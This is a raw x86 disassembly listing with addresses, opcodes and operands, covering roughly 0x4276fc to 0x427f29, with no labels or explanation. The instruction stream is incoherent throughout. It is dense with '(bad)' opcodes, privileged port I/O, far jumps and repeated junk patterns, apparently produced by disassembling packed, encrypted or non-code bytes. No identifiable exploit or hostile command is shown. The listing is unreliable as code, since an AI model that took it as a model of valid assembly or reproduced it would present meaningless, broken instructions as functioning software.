  4276fc:	adc    DWORD PTR [edx-0x4d00d646],esi
  427702:	or     cl,BYTE PTR [ebp-0x29]
  427705:	xor    BYTE PTR ds:[edi+0x36],0xec
  42770a:	ja     0x4276fb
  42770c:	or     al,BYTE PTR [esi+0x4d4d8b1d]
  427712:	xor    BYTE PTR [edi-0x76],0x80
  427716:	lock mov dl,BYTE PTR [ebx+0x7c]
  42771a:	mov    dl,0x86
  42771c:	or     al,0x53
  42771e:	adc    DWORD PTR [edx-0x4d00d646],esi
  427724:	or     cl,BYTE PTR [ebp-0x29]
  427727:	xor    BYTE PTR ds:[edi+0x36],0xec
  42772c:	ja     0x42771d
  42772e:	or     al,BYTE PTR [esi+0x4d4d4b0b]
  427734:	xor    al,0x46
  427737:	xor    BYTE PTR [edi+0x46],0x53
  42773b:	je     0x427790
  42773d:	sub    dh,BYTE PTR [edx-0x7b4df342]
  427743:	sub    edi,edi
  427745:	mov    dl,0x80
  427747:	lock cs push ebx
  42774a:	mov    dl,0x40
  42774c:	lea    edi,[edx]
  42774e:	lea    ecx,[ebp-0x72c8ea2b]
  427754:	int    0x8d
  427756:	lea    ecx,[edx]
  427758:	dec    ebp
  427759:	xlat   BYTE PTR ds:[ebx]
  42775a:	ds adc bh,0x36
  42775e:	in     al,dx
  42775f:	xlat   BYTE PTR ds:[ebx]
  427760:	out    dx,eax
  427761:	xchg   BYTE PTR [esi-0x7fb2b258],bl
  427767:	ja     0x4277da
  427769:	xor    al,0x3e
  42776c:	cmp    ch,bh
  42776e:	xor    BYTE PTR [edi+0x3e],0xec
  427772:	ja     0x4276fa
  427774:	push   eax
  427775:	ja     0x4276fd
  427777:	xor    BYTE PTR [edi-0x75],0x80
  42777b:	lock mov edx,DWORD PTR [ebx+0x11]
  42777f:	mov    dl,0xba
  427781:	sub    DWORD PTR [ebx+0x7c],edx
  427784:	mov    dl,0x86
  427786:	or     al,0xff
  427788:	mov    dl,0x80
  42778a:	lock xchg BYTE PTR [ecx],cl
  42778d:	and    dh,BYTE PTR [edx-0x7f750f80]
  427793:	xchg   edi,eax
  427794:	mov    dl,BYTE PTR [ebx+0x2a]
  427797:	push   ebx
  427798:	xchg   esp,eax
  427799:	mov    dl,0xbe
  42779b:	or     al,0xb2
  42779d:	clc    
  42779e:	sub    edi,edi
  4277a0:	(bad)  
  4277a1:	in     al,dx
  4277a2:	lock mul DWORD PTR [ebx-0x4e]
  4277a6:	or     edx,ebp
  4277a8:	hlt    
  4277a9:	retf   
  4277aa:	dec    ebp
  4277ab:	dec    ebp
  4277ac:	xor    BYTE PTR [edi-0x11],0xab
  4277b0:	test   eax,0x71fb70a3
  4277b5:	lea    edx,[edi-0x78127880]
  4277bb:	adc    eax,0x539b9993
  4277c0:	push   0xffffff80
  4277c2:	ja     0x4277f9
  4277c4:	or     ch,0x2e
  4277c7:	cmp    cl,BYTE PTR [ebp-0x10687f73]
  4277cd:	or     BYTE PTR [ebp-0x7fde2880],0xe7
  4277d4:	out    dx,eax
  4277d5:	and    BYTE PTR [edi-0x7588afdf],0x60
  4277dc:	fistp  DWORD PTR [eax-0x21]
  4277df:	adc    DWORD PTR [ebx-0x4a],edx
  4277e2:	pop    esi
  4277e3:	xchg   BYTE PTR [edi+0x32532643],cl
  4277e9:	or     DWORD PTR [esi-0x3e],eax
  4277ec:	or     al,0xb2
  4277ee:	mov    esp,0x8d4ba229
  4277f3:	lea    ecx,[ebp+0xc88b2cd]
  4277f9:	push   ebx
  4277fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277fb:	dec    DWORD PTR [ebx-0x80]
  4277fe:	out    0x1d,eax
  427800:	call   DWORD PTR [ebx+eiz*2+0x6313d79c]
  427807:	(bad)  
  427808:	xlat   BYTE PTR ds:[ebx]
  427809:	or     DWORD PTR [edx-0x54881f31],esp
  42780f:	push   esi
  427810:	sar    ebx,cl
  427812:	adc    al,0x62
  427814:	mov    esi,0x8d8d3a9c
  427819:	adc    BYTE PTR [edi+0x15d78071],0x80
  427820:	xchg   edi,eax
  427821:	out    dx,eax
  427822:	adc    bh,0x21
  427825:	adc    BYTE PTR [edi+0x21d780ef],0x80
  42782c:	out    0xef,eax
  42782e:	and    BYTE PTR [edi+0x53325321],0xb6
  427835:	or     DWORD PTR [esi-0x3e],eax
  427838:	or     al,0xb2
  42783a:	mov    esp,0x8d4ba229
  42783f:	lea    ecx,[ebp-0x5bac33]
  427845:	xchg   esp,eax
  427846:	mov    dl,0x88
  427848:	or     al,0xff
  42784a:	dec    ebx
  42784b:	and    bh,0x71
  42784e:	and    BYTE PTR [edi-0x7f7daceb],0x77
  427855:	jno    0x4278aa
  427857:	retf   
  427858:	xor    al,0x15
  42785b:	or     DWORD PTR [esi-0x54],eax
  42785e:	or     al,0xb2
  427860:	test   BYTE PTR [ecx],ch
  427862:	push   ebx
  427863:	jo     0x427864
  427865:	retf   
  427866:	push   edi
  427867:	lea    ecx,[ebp-0x3b4d3273]
  42786d:	or     al,0xff
  42786f:	add    BYTE PTR [eax-0x63131089],0x13
  427876:	mov    BYTE PTR [eax+0x21d78051],0x80
  42787d:	out    0x71,eax
  42787f:	and    BYTE PTR [edi-0x757b12eb],0xed
  427886:	mov    esp,0x29beb28a
  42788b:	push   ebx
  42788c:	jb     0x4278e5
  42788e:	aad    0x58
  427890:	fist   WORD PTR [ecx]
  427892:	mov    ds:0x438f860b,al
  427897:	mov    es:0xdf58d54b,al
  42789d:	adc    DWORD PTR [edx+0x438f86c6],esp
  4278a3:	es in  al,dx
  4278a5:	jl     0x4278ba
  4278a7:	(bad)  
  4278a8:	(bad)  
  4278a9:	std    
  4278aa:	(bad)  
  4278ab:	jle    0x42790b
  4278ad:	xchg   BYTE PTR [edi+0x5a22643],cl
  4278b3:	fstp   DWORD PTR [eax-0x21]
  4278b6:	adc    DWORD PTR [ebx-0x9],edx
  4278b9:	mov    ds:0xdf58e8cb,al
  4278be:	adc    edi,edx
  4278c0:	adc    esp,DWORD PTR [ebx-0x9]
  4278c3:	xlat   BYTE PTR ds:[ebx]
  4278c4:	or     DWORD PTR [edx+0x3ca10d57],esp
  4278ca:	(bad)  
  4278cc:	loope  0x4278e2
  4278ce:	enter  0x25be,0x3a
  4278d2:	lea    ecx,[ebp-0x7f106880]
  4278d8:	xlat   BYTE PTR ds:[ebx]
  4278d9:	and    DWORD PTR [eax-0x187f1059],eax
  4278df:	and    DWORD PTR [ebx+0x32],edx
  4278e2:	pusha  
  4278e3:	fistp  DWORD PTR [eax-0x21]
  4278e6:	adc    DWORD PTR [ebx-0x4a],edx
  4278e9:	or     DWORD PTR [esi-0x3e],eax
  4278ec:	or     al,0xb2
  4278ee:	mov    BYTE PTR [ebx+edx*2],cl
  4278f1:	dec    ebp
  4278f2:	mov    dl,0xb4
  4278f4:	sub    DWORD PTR [eax-0x29],edx
  4278f7:	enter  0x9cff,0x80
  4278fb:	out    0xc8,eax
  4278fd:	cli    
  4278fe:	lea    ecx,[ebp+0x453cd8d]
  427904:	inc    DWORD PTR [esi]
  427906:	and    BYTE PTR [edi+0x50238025],0xa7
  42790d:	xor    ah,BYTE PTR [ebx+0x3]
  427910:	xlat   BYTE PTR ds:[ebx]
  427911:	outs   dx,DWORD PTR ds:[esi]
  427912:	push   ebx
  427913:	jb     0x427978
  427915:	pushf  
  427916:	aad    0xb0
  427918:	dec    ebp
  427919:	xlat   BYTE PTR ds:[ebx]
  42791a:	xor    eax,0x4d25d780
  42791f:	xlat   BYTE PTR ds:[ebx]
  427920:	sub    eax,0x4d8ad74d
  427925:	pop    ecx
  427926:	xchg   BYTE PTR [ebx],dh
  427928:	dec    ebx
  427929:	dec    ebp
  42792a:	dec    ebp
  42792b:	push   eax
  42792c:	outs   dx,DWORD PTR ds:[esi]
  42792d:	mov    esi,0x8d8d8dfa
  427932:	adc    BYTE PTR [edi+0x21e780ef],0x53
  427939:	mov    edx,DWORD PTR [ebx-0x4a]
  42793c:	or     DWORD PTR [esi-0x7b],eax
  42793f:	or     al,0xb2
  427941:	popa   
  427942:	or     al,0x50
  427944:	out    0xc8,eax
  427946:	and    bh,0xef
  427949:	and    BYTE PTR [edi+0x29bcb221],0x53
  427950:	or     eax,0x53c8d780
  427955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427956:	dec    DWORD PTR [ebx-0x80]
  427959:	out    0x71,eax
  42795b:	push   ebx
  42795c:	retf   
  42795d:	call   DWORD PTR [eax+eax*4-0x7dacea59]
  427964:	cmp    BYTE PTR [eax+eax*4-0x19],0x71
  427969:	adc    BYTE PTR [ecx],0x80
  42796c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42796d:	adc    eax,0xcfd4609
  427972:	mov    dl,0xbc
  427974:	sub    DWORD PTR [ebx-0x5c],edx
  427977:	mov    dl,0xbe
  427979:	or     al,0xa2
  42797b:	dec    ebx
  42797c:	lea    ecx,[ebp+0x74ffcd8d]
  427982:	jmp    FWORD PTR [edx]
  427984:	arpl   di,si
  427986:	xlat   BYTE PTR ds:[ebx]
  427987:	sbb    DWORD PTR [ebx+0x5],esp
  42798a:	xlat   BYTE PTR ds:[ebx]
  42798b:	nop
  42798c:	dec    edx
  42798d:	push   ebx
  42798e:	test   DWORD PTR [esi],ebx
  427990:	jne    0x427951
  427992:	push   0xffffffc8
  427994:	outs   dx,DWORD PTR ds:[esi]
  427995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427996:	jbe    0x4279cc
  427998:	push   ebx
  427999:	test   DWORD PTR [esi],ebx
  42799b:	jne    0x427961
  42799d:	stos   BYTE PTR es:[edi],al
  42799e:	xor    BYTE PTR [edi-0x11],0x80
  4279a2:	lock and DWORD PTR [eax-0x287f1069],eax
  4279a9:	and    DWORD PTR [edx+0x438f8605],esp
  4279af:	es push edi
  4279b1:	fistp  DWORD PTR [eax-0x21]
  4279b4:	adc    DWORD PTR [ecx],ecx
  4279b6:	inc    esi
  4279b7:	std    
  4279b8:	or     al,0x80
  4279ba:	ret    0x4d53
  4279bd:	push   ebx
  4279be:	jb     0x427972
  4279c0:	add    ch,BYTE PTR [ecx]
  4279c2:	push   ebx
  4279c3:	test   DWORD PTR [edx+0xba20cbe],esi
  4279c9:	lea    ecx,[ebp+0x7cffcd8d]
  4279cf:	call   DWORD PTR [ecx+0x5f]
  4279d2:	ja     0x42795e
  4279d4:	xlat   BYTE PTR ds:[ebx]
  4279d5:	out    dx,al
  4279d6:	arpl   WORD PTR [esi+0x47a221d5],si
  4279dc:	fisubr WORD PTR [eax+0x2d]
  4279df:	mov    ds:0xe3bb390a,al
  4279e4:	les    esp,FWORD PTR [esi-0x5e2bc85e]
  4279ea:	adc    edx,ebp
  4279ec:	pop    esp
  4279ed:	js     0x427a13
  4279ef:	xor    ch,BYTE PTR [ebx-0x48f5c57]
  4279f5:	sub    eax,0x8780978d
  4279fa:	in     eax,dx
  4279fb:	xchg   DWORD PTR [ecx],esp
  4279fd:	xor    BYTE PTR [edi-0x11],0x80
  427a01:	lock and DWORD PTR [ecx],ecx
  427a04:	inc    esi
  427a05:	std    
  427a06:	or     al,0xb2
  427a08:	mov    esi,0xeff0800c
  427a0d:	adc    BYTE PTR [edi-0x454d66df],0x29
  427a14:	xor    al,0x1d
  427a17:	cli    
  427a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a19:	mov    DWORD PTR [esp+edx*8],0x7253fc53
  427a20:	(bad)  
  427a21:	sti    
  427a22:	push   eax
  427a23:	cmp    al,BYTE PTR [eax-0x327fda89]
  427a29:	cmp    cl,BYTE PTR ss:[ebp-0x7f107f73]
  427a30:	ja     0x427a57
  427a32:	or     ch,0x36
  427a35:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  427a3b:	xchg   edx,eax
  427a3c:	gs xor al,0x25
  427a40:	adc    BYTE PTR [eax+0x32],0x3a
  427a44:	lea    ecx,[ebp-0x1dea8080]
  427a4a:	out    dx,al
  427a4b:	mov    ebp,0x8d8d818d
  427a50:	dec    ebp
  427a51:	push   edx
  427a52:	or     ch,BYTE PTR [edx-0x73af49b3]
  427a58:	xor    BYTE PTR [edi-0x11],0x80
  427a5c:	lock and DWORD PTR [ecx],ecx
  427a5f:	inc    esi
  427a60:	std    
  427a61:	or     al,0xb2
  427a63:	mov    esi,0xeff0800c
  427a68:	adc    BYTE PTR [edi+0x25d74d21],0x53
  427a6f:	cld    
  427a70:	push   ebx
  427a71:	jb     0x427a72
  427a73:	sti    
  427a74:	push   eax
  427a75:	ja     0x427a01
  427a77:	add    DWORD PTR [edi-0x76],esi
  427a7a:	or     bl,BYTE PTR [ebx-0x4de228b3]
  427a80:	mov    edx,0x15d74d29
  427a85:	dec    ebp
  427a86:	xlat   BYTE PTR ds:[ebx]
  427a87:	jno    0x427ad6
  427a89:	xlat   BYTE PTR ds:[ebx]
  427a8a:	and    DWORD PTR [ebp-0x29],ecx
  427a8d:	out    dx,eax
  427a8e:	xchg   BYTE PTR [ebx],dh
  427a90:	int3   
  427a91:	dec    ebp
  427a92:	dec    ebp
  427a93:	xor    BYTE PTR [edi-0x11],0x80
  427a97:	lock and DWORD PTR [ecx],ecx
  427a9a:	inc    esi
  427a9b:	std    
  427a9c:	or     al,0xb2
  427a9e:	mov    esi,0xeff0800c
  427aa3:	adc    BYTE PTR [edi+0x53fc5321],0x72
  427aaa:	mov    dl,0xba
  427aac:	sub    DWORD PTR [eax+0x63fbff09],eax
  427ab2:	std    
  427ab3:	aad    0x37
  427ab5:	xor    BYTE PTR [edi+0x71],0x80
  427ab9:	lock adc eax,0xcfd4609
  427abf:	mov    dl,0xbe
  427ac1:	or     al,0x80
  427ac3:	lock jno 0x427a46
  427ac6:	xchg   edi,eax
  427ac7:	adc    eax,0x7253fc53
  427acc:	mov    dl,0xba
  427ace:	sub    DWORD PTR [eax-0x400e210],eax
  427ad4:	or     DWORD PTR [edx],esp
  427ad6:	ja     0x427a62
  427ad8:	push   eax
  427ad9:	cmp    ch,BYTE PTR [ecx-0x72e20490]
  427adf:	xchg   edi,eax
  427ae0:	add    BYTE PTR [edi-0x64666c6a],0x53
  427ae7:	push   0xffffff80
  427ae9:	xlat   BYTE PTR ds:[ebx]
  427aea:	cmp    eax,0x80459780
  427aef:	out    0x25,eax
  427af1:	pop    esi
  427af2:	xchg   BYTE PTR [edi-0x249fd9bd],cl
  427af8:	pop    eax
  427af9:	fist   WORD PTR [ecx]
  427afb:	arpl   di,si
  427afd:	or     esi,ecx
  427aff:	dec    esp
  427b00:	lea    ecx,[ebp-0x3960fe73]
  427b06:	in     al,0xee
  427b08:	arpl   si,ax
  427b0a:	(bad)  
  427b0c:	arpl   si,ax
  427b0e:	xlat   BYTE PTR ds:[ebx]
  427b0f:	out    dx,eax
  427b10:	arpl   di,si
  427b12:	or     DWORD PTR [edi],ecx
  427b14:	pop    ss
  427b15:	or     al,0x8d
  427b17:	lea    esp,[edx-0x20a755f3]
  427b1d:	adc    edi,edx
  427b1f:	out    dx,eax
  427b20:	arpl   di,si
  427b22:	or     DWORD PTR [edi],ecx
  427b24:	das    
  427b25:	or     al,0x8d
  427b27:	lea    esp,[edx-0x20a766f3]
  427b2d:	adc    edi,edx
  427b2f:	out    dx,eax
  427b30:	arpl   di,si
  427b32:	or     DWORD PTR [edi],ecx
  427b34:	dec    ebx
  427b35:	lea    ecx,[ebp-0x56f25d73]
  427b3b:	pop    eax
  427b3c:	fist   WORD PTR [ecx]
  427b3e:	xlat   BYTE PTR ds:[ebx]
  427b3f:	out    dx,al
  427b40:	arpl   di,si
  427b42:	aad    0x3f
  427b44:	mov    ds:0xdf58d00d,al
  427b49:	adc    edi,edx
  427b4b:	out    dx,eax
  427b4c:	arpl   di,si
  427b4e:	or     DWORD PTR [edi],ecx
  427b50:	mov    al,ds:0xa28d8d3a
  427b55:	or     eax,0x11df58b9
  427b5a:	or     DWORD PTR [edi-0x24],ecx
  427b5d:	cmp    cl,BYTE PTR [ebp+0x9f7638d]
  427b63:	(bad)  
  427b65:	lea    ecx,[ebp+0x3aa2be8d]
  427b6b:	lea    ecx,[ebp+0x4d1dd74d]
  427b71:	xlat   BYTE PTR ds:[ebx]
  427b72:	sub    eax,0x4d15d74d
  427b77:	xlat   BYTE PTR ds:[ebx]
  427b78:	jno    0x427bc7
  427b7a:	xlat   BYTE PTR ds:[ebx]
  427b7b:	and    DWORD PTR [ebp-0x29],ecx
  427b7e:	out    dx,eax
  427b7f:	xchg   bl,dl
  427b81:	or     eax,0xb7be4d4d
  427b86:	cmp    cl,BYTE PTR [ebp-0x3ef25d73]
  427b8c:	pop    eax
  427b8d:	fist   WORD PTR [ecx]
  427b8f:	xlat   BYTE PTR ds:[ebx]
  427b90:	out    dx,eax
  427b91:	arpl   di,si
  427b93:	or     DWORD PTR [edi],ecx
  427b95:	loope  0x427b24
  427b97:	lea    ecx,[ebp+0x58e40da2]
  427b9d:	fist   WORD PTR [ecx]
  427b9f:	xlat   BYTE PTR ds:[ebx]
  427ba0:	out    dx,eax
  427ba1:	arpl   di,si
  427ba3:	or     DWORD PTR [edi],ecx
  427ba5:	mov    cl,0x3a
  427ba7:	lea    ecx,[ebp+0x58d90da2]
  427bad:	fist   WORD PTR [ecx]
  427baf:	xlat   BYTE PTR ds:[ebx]
  427bb0:	out    dx,al
  427bb1:	arpl   di,si
  427bb3:	aad    0x1d
  427bb5:	mov    ds:0xdf58e60d,al
  427bba:	adc    edi,edx
  427bbc:	out    dx,eax
  427bbd:	arpl   di,si
  427bbf:	or     DWORD PTR [edi],ecx
  427bc1:	aam    0x3a
  427bc3:	lea    ecx,[ebp+0x58e80da2]
  427bc9:	fist   WORD PTR [ecx]
  427bcb:	les    eax,FWORD PTR [ecx]
  427bcd:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427bd4:	out    0xef,eax
  427bd6:	and    BYTE PTR [edi+0x53325321],0xb6
  427bdd:	or     DWORD PTR [esi-0x3e],eax
  427be0:	or     al,0xb2
  427be2:	mov    esp,0x8d4ba229
  427be7:	lea    ecx,[ebp+0xc88b2cd]
  427bed:	push   ebx
  427bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bef:	dec    DWORD PTR [ebx-0x80]
  427bf2:	out    0xef,eax
  427bf4:	call   DWORD PTR [eax+eax*4-0x6313de59]
  427bfb:	adc    eax,esi
  427bfd:	push   eax
  427bfe:	xchg   edi,eax
  427bff:	out    dx,eax
  427c00:	push   eax
  427c01:	xlat   BYTE PTR ds:[ebx]
  427c02:	and    DWORD PTR [eax-0x287f1069],eax
  427c08:	and    DWORD PTR [eax-0x587f1019],eax
  427c0e:	and    DWORD PTR [ebx+0x32],edx
  427c11:	push   ebx
  427c12:	mov    dh,0x9
  427c14:	inc    esi
  427c15:	ret    0xb20c
  427c18:	mov    esp,0xb2a45329
  427c1d:	mov    BYTE PTR [edx+eiz*4],cl
  427c20:	dec    ebx
  427c21:	lea    ecx,[ebp-0x6b003273]
  427c27:	dec    DWORD PTR [ebx+0x3f]
  427c2a:	xchg   edi,eax
  427c2b:	jno    0x427c4c
  427c2d:	xlat   BYTE PTR ds:[ebx]
  427c2e:	adc    eax,0x803d9780
  427c33:	xlat   BYTE PTR ds:[ebx]
  427c34:	inc    ebp
  427c35:	adc    BYTE PTR [edi+0x15d78071],0x80
  427c3c:	xchg   edi,eax
  427c3d:	jno    0x427bbf
  427c3f:	xlat   BYTE PTR ds:[ebx]
  427c40:	adc    eax,0x8071e780
  427c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c46:	adc    eax,0xb6533253
  427c4b:	or     DWORD PTR [esi-0x3e],eax
  427c4e:	or     al,0xb2
  427c50:	mov    esp,0xa2a45329
  427c55:	dec    ebx
  427c56:	lea    ecx,[ebp-0x774d3273]
  427c5c:	or     al,0xff
  427c5e:	dec    ebx
  427c5f:	and    bh,0x3d
  427c62:	call   DWORD PTR [eax+eax*4-0x34acba59]
  427c69:	push   ebx
  427c6a:	add    BYTE PTR [eax-0xf7fc289],0x45
  427c71:	or     DWORD PTR [esi-0x54],eax
  427c74:	or     al,0x53
  427c76:	jo     0x427c2a
  427c78:	test   BYTE PTR [ecx],ch
  427c7a:	push   edi
  427c7b:	lea    ecx,[ebp-0x34003273]
  427c81:	xor    al,0x71
  427c84:	mov    dl,0xc4
  427c86:	or     al,0xff
  427c88:	sub    ah,0x9c
  427c8b:	adc    BYTE PTR [edi-0x1239eceb],0xba
  427c92:	mov    dh,BYTE PTR [edx+0x6a532988]
  427c98:	mov    ds:0xdf58d505,al
  427c9d:	adc    DWORD PTR [edx+0x438f86c2],esp
  427ca3:	es and bh,0x3d
  427ca7:	and    BYTE PTR [edi-0x754312bb],0xa2
  427cae:	dec    ebx
  427caf:	aad    0x58
  427cb1:	fist   WORD PTR [ecx]
  427cb3:	mov    ds:0x438f86c6,al
  427cb8:	es in  al,dx
  427cba:	sub    al,BYTE PTR [eax-0x6becda19]
  427cc0:	(bad)  
  427cc1:	sti    
  427cc2:	push   edi
  427cc3:	xchg   BYTE PTR [edi-0xf5d9bd],cl
  427cc9:	add    eax,0x58d90ba2
  427cce:	fist   WORD PTR [ecx]
  427cd0:	cdq    
  427cd1:	dec    ebp
  427cd2:	xlat   BYTE PTR ds:[ebx]
  427cd3:	xor    eax,0x9b2dd74d
  427cd8:	dec    ebp
  427cd9:	xlat   BYTE PTR ds:[ebx]
  427cda:	sbb    eax,0x4d15d74d
  427cdf:	xlat   BYTE PTR ds:[ebx]
  427ce0:	jno    0x427d2f
  427ce2:	xlat   BYTE PTR ds:[ebx]
  427ce3:	and    DWORD PTR [ebp-0x29],ecx
  427ce6:	out    dx,eax
  427ce7:	xchg   dh,al
  427ce9:	int3   
  427cea:	dec    ebp
  427ceb:	dec    ebp
  427cec:	push   eax
  427ced:	mov    WORD PTR [eax-0x5c565474],es
  427cf3:	jo     0x427cf0
  427cf5:	cmp    eax,0xef97808d
  427cfa:	adc    bh,0x21
  427cfd:	and    bh,0xef
  427d00:	and    BYTE PTR [edi+0x53b65321],0x32
  427d07:	or     DWORD PTR [esi-0x3e],eax
  427d0a:	or     al,0xb2
  427d0c:	mov    esp,0x8d4ba229
  427d11:	lea    ecx,[ebp+0xc88b2cd]
  427d17:	push   ebx
  427d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d19:	call   DWORD PTR [edi+edi*8+0x71e7804b]
  427d20:	and    BYTE PTR [edi-0x6300eb],0xc6
  427d27:	push   eax
  427d28:	xchg   edi,eax
  427d29:	jno    0x427d7b
  427d2b:	xlat   BYTE PTR ds:[ebx]
  427d2c:	adc    eax,0x803d9780
  427d31:	xlat   BYTE PTR ds:[ebx]
  427d32:	inc    ebp
  427d33:	adc    BYTE PTR [edi+0x15d78071],0x80
  427d3a:	xchg   edi,eax
  427d3b:	out    dx,eax
  427d3c:	adc    bh,0x21
  427d3f:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427d46:	out    0xef,eax
  427d48:	and    BYTE PTR [edi+0x53b65321],0x32
  427d4f:	or     DWORD PTR [esi-0x3e],eax
  427d52:	or     al,0xb2
  427d54:	mov    esp,0x8d4ba229
  427d59:	lea    ecx,[ebp-0x5bac33]
  427d5f:	xchg   esp,eax
  427d60:	mov    dl,0x88
  427d62:	or     al,0xff
  427d64:	dec    ebx
  427d65:	and    bh,0x71
  427d68:	and    BYTE PTR [edi+0x53cb5315],0x82
  427d6f:	xor    BYTE PTR [edi+0x71],0x80
  427d73:	lock adc eax,0xcac4609
  427d79:	push   ebx
  427d7a:	jo     0x427d7b
  427d7c:	retf   
  427d7d:	mov    dl,0x84
  427d7f:	sub    DWORD PTR [edi-0x73],edx
  427d82:	lea    ecx,[ebp+0xcc4b2cd]
  427d88:	inc    DWORD PTR [edx-0x7fc28880]
  427d8e:	lock inc ebp
  427d90:	in     al,dx
  427d91:	pushf  
  427d92:	and    bh,0x3d
  427d95:	adc    eax,esi
  427d97:	and    BYTE PTR [edi-0x79fa5dbb],0x8f
  427d9e:	inc    ebx
  427d9f:	es push edi
  427da1:	fistp  DWORD PTR [eax-0x21]
  427da4:	adc    DWORD PTR [ecx],ecx
  427da6:	inc    esi
  427da7:	std    
  427da8:	or     al,0xb2
  427daa:	mov    esp,0xcbeb229
  427daf:	push   ebx
  427db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427db1:	mov    ds:0x8d8d8d4b,al
  427db6:	int    0xff
  427db8:	sub    bh,bh
  427dba:	je     0x427da8
  427dbc:	not    DWORD PTR [ebx]
  427dbe:	add    eax,0x80eff080
  427dc3:	xchg   edi,eax
  427dc4:	and    DWORD PTR [eax-0x587f8e19],eax
  427dca:	adc    eax,0xed8abaed
  427dcf:	mov    esp,0xd505a28a
  427dd4:	pop    eax
  427dd5:	fist   WORD PTR [ecx]
  427dd7:	mov    ds:0xdf58d54b,al
  427ddc:	adc    DWORD PTR [edx+0x6a532988],esi
  427de2:	mov    ds:0x438f86c2,al
  427de7:	mov    es:0x438f86c6,al
  427ded:	es in  al,dx
  427def:	sub    dl,BYTE PTR [ebx]
  427df1:	xchg   esp,eax
  427df2:	mov    esi,0x4d4d0d48
  427df7:	xchg   edi,eax
  427df8:	add    BYTE PTR [edi-0x66e27813],0x60
  427dff:	fstp   DWORD PTR [eax-0x21]
  427e02:	adc    DWORD PTR [eax-0x10],edx
  427e05:	xor    bl,BYTE PTR [esi-0x7a]
  427e08:	pop    DWORD PTR [ebx+0x26]
  427e0b:	push   eax
  427e0c:	ja     0x427dd6
  427e0e:	jl     0x427e87
  427e10:	xchg   ah,ah
  427e12:	pop    eax
  427e13:	fist   WORD PTR [ecx]
  427e15:	push   eax
  427e16:	ja     0x427d9f
  427e18:	adc    BYTE PTR [edi-0x37287fce],0x9b
  427e1f:	or     DWORD PTR [esi-0x3e],eax
  427e22:	or     al,0xb2
  427e24:	mov    BYTE PTR [eax+eax*4],cl
  427e27:	xlat   BYTE PTR ds:[ebx]
  427e28:	xor    al,BYTE PTR [eax-0x5df53719]
  427e2e:	ret    0xc7a7
  427e31:	add    al,0xd4
  427e33:	push   ebx
  427e34:	dec    ebp
  427e35:	xchg   esi,eax
  427e36:	call   FWORD PTR [eax+edx*2-0x687f7569]
  427e3d:	and    DWORD PTR [eax-0x69],edx
  427e40:	and    DWORD PTR [ebp-0x29],ecx
  427e43:	and    DWORD PTR [ecx],eax
  427e45:	ja     0x427dd1
  427e47:	dec    ebp
  427e48:	xlat   BYTE PTR ds:[ebx]
  427e49:	out    dx,eax
  427e4a:	mov    dl,0x2
  427e4c:	sub    DWORD PTR [edx],ecx
  427e4e:	dec    ebp
  427e4f:	xlat   BYTE PTR ds:[ebx]
  427e50:	and    DWORD PTR [ebp-0x29],ecx
  427e53:	xchg   DWORD PTR [ebp-0x29],ecx
  427e56:	xchg   BYTE PTR [ebp-0x29],cl
  427e59:	enter  0xd74d,0x32
  427e5d:	xchg   bh,ah
  427e5f:	mov    cl,BYTE PTR [ebp+0x4d]
  427e62:	stos   DWORD PTR es:[edi],eax
  427e63:	push   eax
  427e64:	ja     0x427df0
  427e66:	xor    BYTE PTR [edi-0x76],0xa9
  427e6a:	jo     0x427e67
  427e6c:	out    dx,eax
  427e6d:	lea    edx,[edi-0x6127880]
  427e73:	mov    ebp,ebp
  427e75:	xchg   DWORD PTR [ebp-0x67],eax
  427e78:	jl     0x427eef
  427e7a:	xor    eax,0x8d8d8d35
  427e7f:	lea    edi,[ebp+esi*2+0x35]
  427e83:	inc    ebp
  427e84:	lea    ecx,[ebp+0x75018d8d]
  427e8a:	xor    eax,0xd74d0a71
  427e8f:	xor    eax,0x4d2dd74d
  427e94:	xlat   BYTE PTR ds:[ebx]
  427e95:	and    eax,0x4d1dd74d
  427e9a:	xlat   BYTE PTR ds:[ebx]
  427e9b:	adc    eax,0x4d71d74d
  427ea0:	xlat   BYTE PTR ds:[ebx]
  427ea1:	and    DWORD PTR [ebp-0x29],ecx
  427ea4:	out    dx,eax
  427ea5:	xchg   cl,bl
  427ea7:	mov    eax,0x77804d4d
  427eac:	out    dx,eax
  427ead:	push   eax
  427eae:	jne    0x427ee5
  427eb0:	out    dx,al
  427eb1:	xor    BYTE PTR [ebp+0x35],0x35
  427eb5:	dec    edi
  427eb6:	push   0x9
  427eb8:	prefetcht0 BYTE PTR [ebp+0x75808d8d]
  427ebf:	xor    eax,0x96a4f45
  427ec4:	(bad)  
  427ec6:	lea    ecx,[ebp+0x35d54d8d]
  427ecc:	and    eax,0x2535d54d
  427ed1:	dec    ebp
  427ed2:	aad    0x35
  427ed4:	and    eax,0x81357580
  427ed9:	dec    ebp
  427eda:	test   DWORD PTR [eax-0x7f11ca8b],0x80ee3575
  427ee4:	jne    0x427f1b
  427ee6:	out    dx,al
  427ee7:	add    DWORD PTR [edi-0x12],esi
  427eea:	push   eax
  427eeb:	jne    0x427f22
  427eed:	out    dx,eax
  427eee:	xor    BYTE PTR [ebp+0x35],0x3d
  427ef2:	in     al,dx
  427ef3:	jne    0x427f2a
  427ef5:	out    dx,al
  427ef6:	push   eax
  427ef7:	jne    0x427f2e
  427ef9:	out    dx,al
  427efa:	xor    BYTE PTR [ebp+0x35],0xee
  427efe:	xor    BYTE PTR [ebp+0x35],0xee
  427f02:	xor    BYTE PTR [ecx],0x35
  427f05:	out    dx,al
  427f06:	adc    BYTE PTR [eax+0x26],0x3a
  427f0a:	lea    ecx,[ebp-0x2a7ff180]
  427f10:	xor    eax,0x2ecd80ef
  427f15:	cmp    cl,BYTE PTR [ebp+0x9195f8d]
  427f1b:	jmp    0x7180:0x8d8d3a16
  427f22:	add    BYTE PTR [ecx+0x165aa80],0x95
  427f29:	sbb    DWORD PTR [edx],ecx
